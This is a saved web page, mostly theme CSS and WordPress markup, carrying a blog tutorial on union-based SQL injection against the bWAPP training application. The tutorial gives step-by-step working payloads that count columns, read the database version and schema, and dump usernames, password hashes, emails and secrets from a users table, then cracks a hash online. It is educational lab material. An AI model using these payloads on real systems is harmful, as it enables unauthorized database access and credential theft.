button.button{color:#ffffff; background:#51585e;}#sidebar .price_label,.wpb_widgetised_column .price_label{color:#51585e}.price_label .to,.price_label .from{color:#2c3e50}#sidebar .widget_price_filter .price_slider_amount .button:hover,.wpb_widgetised_column .widget_price_filter .price_slider_amount .button:hover{background:#222533; color:#ffffff;}.product_list_widget a,#sidebar .widget_shopping_cart a.button{color:#2c3e50}ul.product_list_widget li{border-bottom:1px solid #ecf0f1}.product_list_widget span.amount{color:#51585e}.product_list_widget ins span.amount{color:#0f97f9}#sidebar .cat-item a,.wpb_widgetised_column .cat-item a{color:#2c3e50}#sidebar .cat-item a:hover,.wpb_widgetised_column .cat-item a:hover{color:#2396e6}#sidebar .cat-item,.wpb_widgetised_column .cat-item,#sidebar .cat-item .children,.wpb_widgetised_column .cat-item .children{border-top:1px solid #ecf0f1}#sidebar .cat-item .children .children a,.wpb_widgetised_column .cat-item .children .children a{color:#51585e}#sidebar .cat-item .children .children a:hover,.wpb_widgetised_column .cat-item .children .children a:hover{color:#222533}#sidebar .cat-got-children:after,.wpb_widgetised_column .cat-got-children:after{border-color:#51585e; color:#51585e;}#sidebar .product_list_widget span.amount,.wpb_widgetised_column .product_list_widget span.amount{color:#51585e}#sidebar .product_list_widget ins span.amount,.wpb_widgetised_column .product_list_widget ins span.amount{color:#0f97f9}#header_container .cart-notification{background:#222533; border-left:5px solid #0f97f9;  }#header_container .cart-notification,#sidebar .widget_shopping_cart .rd_clear_btn{color:#51585e; }#header_container .cart-notification span{color:#ffffff; }.rd_tabs li,.rd_tabs.horizontal .tabs-container{background:#ffffff; }.rd_tabs.horizontal .tabs li,.rd_tabs.horizontal .tabs-container{border:1px solid #ecf0f1; }.rd_tabs.horizontal .tabs li:last-child{border-right:1px solid #ecf0f1 !important; }.rd_tabs.horizontal .active{border-bottom:1px solid #ffffff !important; }.rd_tabs.horizontal.rd_tab_1 li a,.rd_tabs.horizontal.rd_tab_2 li a,.rd_tabs.horizontal.rd_tab_4 li a{color:#51585e; }.rd_tabs.horizontal.rd_tab_1 li a:hover,.rd_tabs.horizontal.rd_tab_2 li a:hover,.rd_tabs.horizontal.rd_tab_4 li a:hover{color:#2c3e50; }.rd_tabs.horizontal.rd_tab_1 .active {border-top:3px solid #0f97f9; }.rd_tabs.horizontal.rd_tab_1 .active a,.rd_tabs.horizontal.rd_tab_2 .active a,.rd_tabs.horizontal.rd_tab_1 .active a:hover,.rd_tabs.horizontal.rd_tab_2 .active a:hover{color:#0f97f9; }.rd_tabs.horizontal.rd_tab_2 .active {border-top:4px solid #0f97f9; }.rd_tabs.horizontal.rd_tab_3 .tabs li{background:#51585e; }.rd_tabs.horizontal.rd_tab_3 .tabs li a{color:#ffffff; }.rd_tabs.horizontal.rd_tab_3 .tabs li.active {background:#ffffff; }.rd_tabs.horizontal.rd_tab_3 .tabs li.active a{color:#2c3e50; }.rd_tabs.horizontal.rd_tab_4 li.active a{color:#2c3e50; }.rd_tabs.rd_vtab_1 #tabs{border-top:1px solid #ecf0f1; }.rd_tabs.rd_vtab_1 li,.rd_tabs.rd_vtab_1 .tab_content{border:1px solid #ecf0f1; }.rd_tabs.rd_vtab_1 li{background:#f9fafb; }.rd_tabs.rd_vtab_1 li.active,.rd_tabs.rd_vtab_1 .tabs-container{background:#ffffff; }.rd_tabs.rd_vtab_1.rd_vtab_left li.active {border-left:1px solid rgba(0,0,0,0); border-right:1px solid #ffffff;}.rd_tabs.rd_vtab_1.rd_vtab_right li.active {border-right:1px solid rgba(0,0,0,0); border-left:1px solid #ffffff;}.rd_tabs.vertical li a{color:#51585e;}.rd_tabs.rd_vtab_1.vertical.rd_vtab_left li a{border-left:5px solid#f9fafb;}.rd_tabs.rd_vtab_1.vertical.rd_vtab_right li a{border-right:5px solid#f9fafb;}.rd_tabs.rd_vtab_1.vertical.rd_vtab_left li.active a{color:#2396e6; border-left:5px solid#0f97f9;}.rd_tabs.rd_vtab_1.vertical.rd_vtab_right li.active a{color:#2396e6; border-right:5px solid#0f97f9;}.rd_tabs.rd_vtab_2 li{border-bottom:1px solid #ecf0f1; }.rd_tabs.rd_vtab_2 li.active a{color:#0f97f9; }.rd_tabs.rd_vtab_2 li{border-bottom:1px solid #ecf0f1; }.rd_tabs.rd_vtab_2.rd_vtab_left .tabs-container{border-left:1px solid #ecf0f1; }.rd_tabs.rd_vtab_2.rd_vtab_left .tab_content{border-left:1px solid #ecf0f1; background:#ffffff;}.rd_tabs.rd_vtab_2.rd_vtab_right .tab_content{border-right:1px solid #ecf0f1; background:#ffffff;}.rd_clear_alert{border:1px solid #ecf0f1; }.thefox_bigloader .loader_button{background:#21C2F8; }#coming_soon_form input[type=button]{background:#1abc9c; }#coming_soon_form input[type=button]:hover{background:#21C2F8; }.thefox_bigloader .loader_tophalf{background: -moz-linear-gradient(left, rgba(52, 192, 191, 0.5) 0%, #1abc9c 100%); background: -webkit-gradient(linear, left top, right top, color-stop(0%,rgba(52, 192, 191, 0.5)) color-stop(100%,#1abc9c)); background: -webkit-linear-gradient(left, rgba(52, 192, 191, 0.5) 0%,#1abc9c 100%); background: -o-linear-gradient(left, rgba(52, 192, 191, 0.5) 0%,#1abc9c 100%); background: -ms-linear-gradient(left, rgba(52, 192, 191, 0.5) 0%,#1abc9c 100%); background: linear-gradient(to right, rgba(52, 192, 191, 0.5) 0%,#1abc9c 100%);}.thefox_bigloader .loader_bottomhalf{background: -moz-linear-gradient(left, rgba(52, 192, 191, 0.5) 1%, rgba(77, 196, 226, 0) 100%); background: -webkit-gradient(linear, left top, right top, color-stop(1%,rgba(52, 192, 191, 0.5)), color-stop(100%,rgba(77, 196, 226, 0))); background: -webkit-linear-gradient(left, rgba(52, 192, 191, 0.5) 1%,rgba(77, 196, 226, 0) 100%); background: -o-linear-gradient(left, rgba(52, 192, 191, 0.5) 1%,rgba(77, 196, 226, 0) 100%); background: -ms-linear-gradient(left, rgba(52, 192, 191, 0.5) 1%,rgba(77, 196, 226, 0) 100%); background: linear-gradient(to right, rgba(52, 192, 191, 0.5) 1%,rgba(77, 196, 226, 0)  100%);}#jpreOverlay .thefox_bigloader .loader_button{background:#21C2F8; }#jpreOverlay .thefox_bigloader .loader_tophalf{background: -moz-linear-gradient(left, rgba(52, 192, 191, 0.5) 0%, #1abc9c 100%); background: -webkit-gradient(linear, left top, right top, color-stop(0%,rgba(52, 192, 191, 0.5)) color-stop(100%,#1abc9c)); background: -webkit-linear-gradient(left, rgba(52, 192, 191, 0.5) 0%,#1abc9c 100%); background: -o-linear-gradient(left, rgba(52, 192, 191, 0.5) 0%,#1abc9c 100%); background: -ms-linear-gradient(left, rgba(52, 192, 191, 0.5) 0%,#1abc9c 100%); background: linear-gradient(to right, rgba(52, 192, 191, 0.5) 0%,#1abc9c 100%);}#jpreOverlay .thefox_bigloader .loader_bottomhalf{background: -moz-linear-gradient(left, rgba(52, 192, 191, 0.5) 1%, rgba(77, 196, 226, 0) 100%); background: -webkit-gradient(linear, left top, right top, color-stop(1%,rgba(52, 192, 191, 0.5)), color-stop(100%,rgba(77, 196, 226, 0))); background: -webkit-linear-gradient(left, rgba(52, 192, 191, 0.5) 1%,rgba(77, 196, 226, 0) 100%); background: -o-linear-gradient(left, rgba(52, 192, 191, 0.5) 1%,rgba(77, 196, 226, 0) 100%); background: -ms-linear-gradient(left, rgba(52, 192, 191, 0.5) 1%,rgba(77, 196, 226, 0) 100%); background: linear-gradient(to right, rgba(52, 192, 191, 0.5) 1%,rgba(77, 196, 226, 0)  100%);}#jpreBar {background: #21c2f8; background: -moz-linear-gradient(left,  #21c2f8 0%, #13d4ae 100%); background: -webkit-gradient(linear, left top, right top, color-stop(0%,#21c2f8), color-stop(100%,#13d4ae)); background: -webkit-linear-gradient(left,  #21c2f8 0%,#13d4ae 100%); background: -o-linear-gradient(left,  #21c2f8 0%,#13d4ae 100%); background: -ms-linear-gradient(left,  #21c2f8 0%,#13d4ae 100%); background: linear-gradient(to right,  #21c2f8 0%,#13d4ae 100%); filter: progid:DXImageTransform.Microsoft.gradient( startColorstr="#21c2f8", endColorstr="#13d4ae",GradientType=1 );} #preloader_3:before{background:#21c2f8}#preloader_3:after{background:#13d4ae}@-webkit-keyframes preloader_3_before { 0% {transform: translateX(0px) rotate(0deg)}  50% {transform: translateX(50px) scale(1.2) rotate(260deg); background:#13d4ae;border-radius:0px;}  100% {transform: translateX(0px) rotate(0deg)}} @keyframes preloader_3_before {  0% {transform: translateX(0px) rotate(0deg)}   50% {transform: translateX(50px) scale(1.2) rotate(260deg); background:#13d4ae;border-radius:0px;}      100% {transform: translateX(0px) rotate(0deg)}} @-webkit-keyframes preloader_3_after {  0% {transform: translateX(0px)}   50% {transform: translateX(-50px) scale(1.2) rotate(-260deg); background:#21c2f8; border-radius:0px;}    100% {transform: translateX(0px)}} @keyframes preloader_3_after {    0% {transform: translateX(0px)}    50% {transform: translateX(-50px) scale(1.2) rotate(-260deg);background:#21c2f8;border-radius:0px;}   100% {transform: translateX(0px)}}#footer_bg,#footer{background:#232323; }#footer,#footer .cat-item a{color:#dddddd; }#footer .widget h2,#footer .widget_recent_entry h4 a{color:#ffffff; }.footer_type_3 .widget h2,.footer_type_8 .widget h2{border-left:5px solid #288bd0; }#footer a{color:#288bd0; }#footer a:hover{color:#288bd0; }#footer .tagcloud a{border:1px solid #dddddd; color:#dddddd; }#footer .tagcloud a:hover{border:1px solid #288bd0; background:#288bd0 !important;  color:#ffffff;}#footer .cat-item a,#footer .children .cat-item a{border-top:1px solid #3a3a3a; border-color:#3a3a3a !important;}#footer .widget_recent_entries li{border-bottom:1px solid #3a3a3a; border-color:#3a3a3a !important;}.footer_type_9{border-top:1px solid #3a3a3a;}.footer_type_5{border-top:10px solid #3a3a3a;}.footer_type_10 .widget_line .small_l_left{border-top:3px solid #288bd0;}#footer .widget_recent_entries ul li{border-bottom:1px solid #3a3a3a}#footer .widget_recent_entries ul li a{color:#dddddd}#footer .widget_recent_entries ul li a:hover{color:#288bd0}#footer #recentcomments li{border-bottom:1px solid #3a3a3a}#footer #recentcomments li a{color:#ffffff;}#footer #recentcomments li a:hover{color:#288bd0;}#footer .rd_widget_recent_entries li,#footer .rd_widget_recent_entries_f li{border-bottom:1px solid #3a3a3a}#footer .w_comment a{color:#dddddd;}#footer .w_comment a:hover{color:#288bd0;}#footer .widget_recent_entry h4 a{color:#ffffff;}#footer .widget_recent_entry h4 a:hover{color:#288bd0;}#footer .widget_archive ul li,#footer .widget_meta ul li{border-bottom:1px solid #3a3a3a}#footer .widget_archive ul li a,#footer .widget_meta ul li a{color:#dddddd;}#footer .widget_archive ul li a:hover,#footer .widget_meta ul li a:hover{color:#0f97f9;}#footer .page_item a, #footer .menu-item a{border-bottom:1px solid #3a3a3a; color:#dddddd;}#footer .page_item a:hover, #footer .menu-item a:hover,#footer .current_page_item a,#footer .current_page_item a{color:#288bd0; }#footer .page_item a:before, #footer .menu-item a:before { color:#288bd0;}#footer #wp-calendar caption{background:#ffffff; color:#232323;}#footer #wp-calendar{border:1px solid #3a3a3a}#footer #wp-calendar th{color:#288bd0;}#footer #wp-calendar tbody td a{color:#fff; background:#288bd0;}#footer #wp-calendar tbody td a:hover{color:#fff; background:#288bd0;}#footer #wp-calendar td#next a:hover:after,#footer #wp-calendar td#prev a:hover:after{background:#288bd0;}#footer #lang_sel a{color:#dddddd; background:#232323; border:1px solid #dddddd}#footer #lang_sel a:hover{color:#ffffff}#footer_coms {background:#1a1a1a; }#footer_coms a{color:#288bd0; }#footer_coms a:hover,#footer_coms .menu a:hover,.f_si_type1 a:hover,#footer_coms #to_top_img:hover{color:#ffffff; }#footer_coms,#footer_coms .menu a,#f_social_icons a,#footer_coms #to_top_img{color:#dddddd; }#footer_coms{border-top:1px solid #1a1a1a;}#footer_coms .f_si_type2 #to_top_img{background:#288bd0!important;}                                    
+</style>
+<meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress.">
+<!--[if lte IE 9]><link rel="stylesheet" type="text/css" href="http://www.danieledonzelli.com/wp-content/plugins/js_composer/assets/css/vc_lte_ie9.min.css" media="screen"><![endif]--><meta name="generator" content="Powered by Slider Revolution 5.4.7.2 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface.">
+<script type="text/javascript">function setREVStartSize(e){									
+						try{ e.c=jQuery(e.c);var i=jQuery(window).width(),t=9999,r=0,n=0,l=0,f=0,s=0,h=0;
+							if(e.responsiveLevels&&(jQuery.each(e.responsiveLevels,function(e,f){f>i&&(t=r=f,l=e),i>f&&f>r&&(r=f,n=e)}),t>r&&(l=n)),f=e.gridheight[l]||e.gridheight[0]||e.gridheight,s=e.gridwidth[l]||e.gridwidth[0]||e.gridwidth,h=i/s,h=h>1?1:h,f=Math.round(h*f),"fullscreen"==e.sliderLayout){var u=(e.c.width(),jQuery(window).height());if(void 0!=e.fullScreenOffsetContainer){var c=e.fullScreenOffsetContainer.split(",");if (c) jQuery.each(c,function(e,i){u=jQuery(i).length>0?u-jQuery(i).outerHeight(!0):u}),e.fullScreenOffset.split("%").length>1&&void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0?u-=jQuery(window).height()*parseInt(e.fullScreenOffset,0)/100:void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0&&(u-=parseInt(e.fullScreenOffset,0))}f=u}else void 0!=e.minHeight&&f<e.minHeight&&(f=e.minHeight);e.c.closest(".rev_slider_wrapper").css({height:f})					
+						}catch(d){console.log("Failure at Presize of Slider:"+d)}						
+					};</script>
+<style type="text/css" title="dynamic-css" class="options-output">.page_title_ctn{background-image:url('http://www.danieledonzelli.com/wp-content/uploads/2016/04/Header_Background.png');}</style><noscript><style type="text/css"> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript><script type="text/javascript" async="" src="./SQL Injection - Union Based - Daniele Donzelli_files/saved_resource(1)"></script><script async="" type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/count.js.download"></script><script type="text/javascript" async="" src="./SQL Injection - Union Based - Daniele Donzelli_files/embed.js.download"></script><style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style><link rel="stylesheet" type="text/css" id="gravatar-card-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/hovercard.min.css"><link rel="stylesheet" type="text/css" id="gravatar-card-services-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/services.min.css"><script src="./SQL Injection - Union Based - Daniele Donzelli_files/count-data.js.download"></script><script src="./SQL Injection - Union Based - Daniele Donzelli_files/count-data.js(1).download"></script><link rel="preload" as="style" href="https://c.disquscdn.com/next/embed/styles/lounge.7881ba4704e5c647ac74c94714fe89c0.css"><link rel="preload" as="script" href="https://c.disquscdn.com/next/embed/common.bundle.505b628fe4a369d7faa766dd8c23b076.js"><link rel="preload" as="script" href="https://c.disquscdn.com/next/embed/lounge.bundle.c9237ca4eec89ddb1320c66204dab595.js"><link rel="preload" as="script" href="https://disqus.com/next/config.js"><script src="./SQL Injection - Union Based - Daniele Donzelli_files/alfalfa_min.d078e4f2a4721192a99e02601a767617.js.download" async="" charset="UTF-8"></script></head>
+
+<body class="post-template-default single single-post postid-262 single-format-image wpb-js-composer js-comp-ver-5.4.7 vc_responsive" data-gr-c-s-loaded="true" style="display: block;">
+<div id="top_bg" class="menu_slide">
+<div id="header_container" style="min-height: 89px;">
+<!-- header -->
+<header class="header_shadow nav_type_3 sticky_header  header_to_shrink clearfix" style="top: 0px; left: 0px; position: relative; width: 100%;">
+<div class="wrapper">
+<!-- logo -->
+<div id="logo_img"><a href="http://www.danieledonzelli.com/"><img class="dark_logo desktop_logo" src="./SQL Injection - Union Based - Daniele Donzelli_files/Logo.png" alt="Daniele Donzelli" title="Daniele Donzelli" scale="0"><img class="white_logo desktop_logo" src="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/" alt="Daniele Donzelli" title="Daniele Donzelli"><img class="dark_logo mobile_logo" src="./SQL Injection - Union Based - Daniele Donzelli_files/Logo.png" alt="Daniele Donzelli" title="Daniele Donzelli" scale="0"><img class="white_logo mobile_logo" src="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/" alt="Daniele Donzelli" title="Daniele Donzelli"></a></div>
+
+
+<!-- logo END-->
+
+  
+  <!-- menu -->
+              <div id="search-form">
+        <form method="get" action="http://www.danieledonzelli.com/" id="searchform">
+          <input type="text" name="s" placeholder="Search" class="search" id="ssform" value="">
+          <input type="submit" id="searchsubmit" value="">
+          <span class="search_button_icon"></span>
+        </form>
+      </div>
+      <div id="searchtop"> <a id="searchtop_img"><i class="fa fa-search"></i></a> </div>
+      <nav class="nav_type_3"><ul id="menu-main-menu" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;"><li class="   menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-25 "><a href="http://www.danieledonzelli.com/">HOME</a></li>
+<li class="   menu-item menu-item-type-post_type menu-item-object-page menu-item-24 "><a href="http://www.danieledonzelli.com/ios/">iOS</a></li>
+<li class="   menu-item menu-item-type-post_type menu-item-object-page menu-item-23 "><a href="http://www.danieledonzelli.com/arduino/">ARDUINO</a></li>
+<li class="   menu-item menu-item-type-post_type menu-item-object-page menu-item-22 "><a href="http://www.danieledonzelli.com/ethical-hacking/">ETHICAL HACKING</a></li>
+<li class="   menu-item menu-item-type-post_type menu-item-object-page menu-item-21 "><a href="http://www.danieledonzelli.com/about/">ABOUT</a></li>
+</ul>      <div id="nav_button"></div></nav>
+      <!-- menu END-->
+          </div>
+    </header>
+  <!-- header END-->
+  </div><style type="text/css">.page_title_ctn {padding-top:43px; padding-bottom:43px;}</style><div class="page_title_ctn"> 
+  <div class="wrapper table_wrapper">
+  <h1>SQL Injection – Union Based</h1>
+  <div class="rd_child_pages child_closed" id="rd_child_pages" style="display: none;"><ul class="child_pages_ctn" style="width: 394px;"></ul></div>     
+<div id="breadcrumbs">
+  <div id="crumbs"><a href="http://www.danieledonzelli.com/">Home</a> <i class="fa-angle-right crumbs_delimiter"></i> <a href="http://www.danieledonzelli.com/category/ethical-hacking/">Ethical Hacking</a> <i class="fa-angle-right crumbs_delimiter"></i> <span>SQL Injection – Union Based</span></div></div>
+ 
+</div>
+</div>
+ 
+<div class="section def_section">
+  <div class="wrapper section_wrapper">
+
+    <div id="posts" class=" left_posts " style="min-height: 1222px;">
+                        
+      <!-- .post -->
+      
+    <div class="post post_single vc_row">
+<a href="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg" class="prettyPhoto "></a><div class="post-attachement"><a href="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg" class="prettyPhoto "><img width="1200" height="565" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunionfeatured-1200x565.jpg" class="attachment-blog_tn size-blog_tn wp-post-image" alt="" srcset="https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg?resize=1200%2C565 1200w, https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg?zoom=2&amp;resize=1200%2C565 2400w, https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg?zoom=3&amp;resize=1200%2C565 3600w" sizes="(max-width: 1200px) 100vw, 1200px" data-attachment-id="275" data-permalink="http://www.danieledonzelli.com/sqlunionfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg" data-orig-size="4342,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="sqlunionfeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured-300x221.jpg" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured-1024x755.jpg"></a></div><div class="sep_25"></div>  <div class="post_ctn clearfix"> 
+    <!-- .title -->
+    <div class="post-title">
+      <h2><a href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/" class="tiptip">
+        SQL Injection – Union Based        </a></h2>
+    </div>
+     <!-- .title END--> 
+     <!-- post-info-top -->
+    <div class="post-info"><span class="pi_author">By <a href="http://www.danieledonzelli.com/author/dany/" title="Posts by Dany" rel="author">Dany</a>    <span class="pi_sep">|</span>    </span><span class="pi_cat"><a href="http://www.danieledonzelli.com/category/ethical-hacking/" rel="category tag">Ethical Hacking</a>    <span class="pi_sep">|</span>    </span><span class="pi_comment"><a href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="262 http://www.danieledonzelli.com/?p=262">0 Comments</a>    <span class="pi_sep">|</span>    </span><span class="pi_date">4 July, 2016    <span class="pi_sep">|</span>    </span><span class="pi_like"><a href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#" class="zilla-likes tiptip" id="zilla-likes-262"><span class="zilla-likes-count">3</span> <span class="zilla-likes-postfix"></span></a></span></div>
+    <!-- post-info END-->     
+    <!-- .entry -->    
+    <div class="entry">
+      <p>In this tutorial i’ll show you how sql injection works and how to use it to extract information from the database.<br>
+The <strong>UNION</strong> operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables.<br>
+For this tutorial we’ll use <strong>bWAPP</strong> vulnerable application.<br>
+Start the bee-box and verify the IP address (open the terminal and type “ifconfig”), in my case 192.168.1.10. Now open your browser and connect to bee-box address. Login in and choose  <strong>SQL Injection (GET/Search)</strong></p>
+<p><img class="aligncenter" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunion1.jpg" alt="sqlinjectionunion" width="850" height="161" src-orig="https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunion1.jpg?w=1170" scale="1.25"></p>
+<h4>CHECK IF IT IS VULNERABLE</h4>
+<p>To check if the search form is vulnerable, we have to found an existing film, i found <em>hulk</em></p>
+<p><img class="aligncenter" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunion2.jpg" alt="sqlinjectionunion" width="850" height="277" src-orig="https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunion2.jpg?w=1170" scale="1.25"></p>
+<p>Now we type: <strong>hulk’</strong>, how you can see we get an error, that means it is vulnerable</p>
+<p><img class="aligncenter" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunion3.jpg" alt="sqlinjectionunion" width="850" height="308" src-orig="https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunion3.jpg?w=1170" scale="1.25"></p>
+<h4>DETERMINE THE NUMBER OF COLUMNS</h4>
+<p>To determine the number of columns, we use  <strong>ORDER BY n+1</strong>. We increment the number until we get an error.<br>
+When we type <strong>hulk’ order by 8#</strong> we get an error, so we know that the number of columns is <strong>7</strong></p>
+<p><img class="aligncenter" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunion4.jpg" alt="sqlinjectionunion" width="850" height="302" src-orig="https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunion4.jpg?w=1170" scale="1.25"></p>
+<h4>FIND THE VULNERABLE COLUMNS</h4>
+<p>To find the vulnerable columns we use <strong>UNION SELECT</strong> command. So we type <strong>hulk’ union select 1,2,3,4,5,6,7#</strong> and we will see some numbers appear on the page: 2, 3, 5, 4. These are the vulnerable columns</p>
+<p><img class="aligncenter" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunion5.jpg" alt="sqlinjectionunion" width="850" height="323" src-orig="https://i1.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunion5.jpg?w=1170" scale="1.25"></p>
+<h4>CHECKING THE MYSQL VERSION</h4>
+<p>To check the MySql version, we use <strong>@@version</strong> command. We replace one vulnerable column number with the our command: <strong>hulk’ union select 1,@@version,3,4,5,6,7#</strong>, we get 5.0.96-0ubuntu3</p>
+<p><img class="aligncenter" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunion6.jpg" alt="sqlinjectionunion" width="850" height="290" src-orig="https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunion6.jpg?w=1170" scale="1.25"></p>
+<h4>GET THE TABLES</h4>
+<p>To get the tables insert this: <strong>hulk’ union select 1,group_concat(table_name),3,4,5,6,7 from<br>
+ information_schema.tables where table_schema=database()#</strong>. We get 5 tables: <em>blog</em>, <em>heroes</em>, <em>movies</em>, <em>users</em>, <em>visitors</em></p>
+<p><img class="aligncenter" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunion7.jpg" alt="sqlinjectionunion" width="850" height="316" src-orig="https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunion7.jpg?w=1170" scale="1.25"></p>
+<h4>GET THE COLUMNS</h4>
+<p>An interesting table is <em>users</em>. We extract the columns from this table:<br>
+<strong>hulk’ union select 1,group_concat(column_name, 0x0a),3,4,5,6,7 from information_schema.columns where table_name=”users”#</strong> (0x0a is a space in hexadecimal)</p>
+<p><img class="aligncenter" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunion8.jpg" alt="sqlinjectionunion" width="850" height="486" src-orig="https://i1.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunion8.jpg?w=1170" scale="1.25"></p>
+<h4>EXTRACT THE DATA</h4>
+<p>Finally we can extract the data: <em>login</em>, <em>password</em>, <em>email</em>, <em>secret</em>.<br>
+<strong>hulk’ union select 1,login,password,email,secret,6,7 from users#</strong><br>
+For better display we insert each data in a different column</p>
+<p><img class="aligncenter" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunion9.jpg" alt="sqlinjectionunion" width="850" height="434" src-orig="https://i1.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunion9.jpg?w=1170" scale="1.25"></p>
+<p>How you can see the password is encrypted (sha1). We can decrypt it here: <a href="http://hashtoolkit.com/reverse-hash/" target="_blank">hashtoolkit</a>.<br>
+The password is: <strong>bug</strong>.<br>
+Obviously there are tools that do this automatically, like <strong>sqlmap</strong>. This is an example to understand how these tools work.</p>
+<h3>VIDEO OF THIS TUTORIAL</h3>
+<p><div class="fluid-width-video-wrapper" style="padding-top: 56.25%;"><iframe src="./SQL Injection - Union Based - Daniele Donzelli_files/gIT-dv2n7sQ.html" frameborder="0" allowfullscreen="" id="fitvid0"></iframe></div></p>
+    </div>   
+    <!-- .entry END --> 
+     </div>
+	</div>
+	<!-- .post-content END--> 
+	<!-- .post END -->
+    
+    <div class="tags_container"><div class="tags_icon"></div><div class="single_post_tags">No tags.</div></div>
+    
+            
+	
+    <div class="share_icons_container"><div class="shareicons_icon"></div><div class="single_post_share_icon">   <div class="share-box">
+      <ul>
+        <li id="facebook"> <a target="_blank" onclick="popup = window.open(&#39;http://www.facebook.com/sharer.php?u=http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/&amp;t=SQL Injection – Union Based&#39;, &#39;PopupPage&#39;, &#39;height=450,width=500,scrollbars=yes,resizable=yes&#39;); return false" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#"><i class="fa fa-facebook"></i></a>
+         </li>
+        <li id="twitter"> <a target="_blank" onclick="popup = window.open(&#39;http://twitter.com/home?status=SQL Injection – Union Based http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/&#39;, &#39;PopupPage&#39;, &#39;height=450,width=500,scrollbars=yes,resizable=yes&#39;); return false" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#"><i class="fa fa-twitter"></i></a>
+         </li>
+        <li id="lin"> <a target="_blank" onclick="popup = window.open(&#39;http://linkedin.com/shareArticle?mini=true&amp;url=http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/&amp;title=SQL Injection – Union Based&#39;, &#39;PopupPage&#39;, &#39;height=450,width=500,scrollbars=yes,resizable=yes&#39;); return false" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#"><i class="fa fa-linkedin"></i></a>
+         </li>
+        <li id="reddit"> <a target="_blank" onclick="popup = window.open(&#39;http://reddit.com/submit?url=http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/&amp;title=SQL Injection – Union Based&#39;, &#39;PopupPage&#39;, &#39;height=450,width=500,scrollbars=yes,resizable=yes&#39;); return false" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#"><i class="fa fa-reddit"></i></a>
+         </li>
